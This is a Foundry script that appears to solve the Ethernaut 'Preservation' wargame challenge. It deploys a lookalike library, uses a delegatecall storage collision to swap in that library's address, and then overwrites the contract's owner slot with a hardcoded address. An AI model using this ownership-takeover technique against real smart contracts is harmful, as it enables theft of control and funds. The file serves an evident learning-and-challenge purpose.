//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Preservation}  from "src/ethernaut16.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut16Script is Script{
    Preservation instance = Preservation(0xc53061488ba127B81B6Ae2348FCB87fBF7A0D885);
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        LibraryContract libraryContract = new LibraryContract();

        console.log("lib contract :" ,address(libraryContract));
        instance.setFirstTime(uint256(uint160(address(libraryContract))));
        console.log("first time : ",instance.timeZone1Library(),"owner is",instance.owner());
        instance.setFirstTime(uint256(uint160(address(libraryContract))));
        console.log("second time",instance.timeZone1Library(),"owner is",instance.owner());


        vm.stopBroadcast();
    }
}

contract LibraryContract {
    uint256 storedTime;
    uint256 dummy;
    address owner;
    function setTime(uint256 _time) public {
        storedTime = _time;
        dummy = _time;
        owner = 0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779;
    }
}


